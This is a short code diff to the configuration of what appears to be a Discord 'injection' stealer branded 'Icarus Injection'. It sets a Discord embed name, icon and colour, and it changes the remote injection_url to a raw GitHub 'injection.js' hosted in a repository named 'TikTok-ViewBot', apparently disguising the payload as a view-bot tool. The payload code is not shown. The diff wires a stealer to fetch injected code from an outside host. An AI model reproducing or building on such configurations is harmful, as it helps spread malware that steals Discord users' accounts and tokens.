@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Icarus Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1063895061747728424/1067201856809488444/I.png?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/IcarusExE/TikTok-ViewBot/main/injection.js', 
   /**
    
    **/
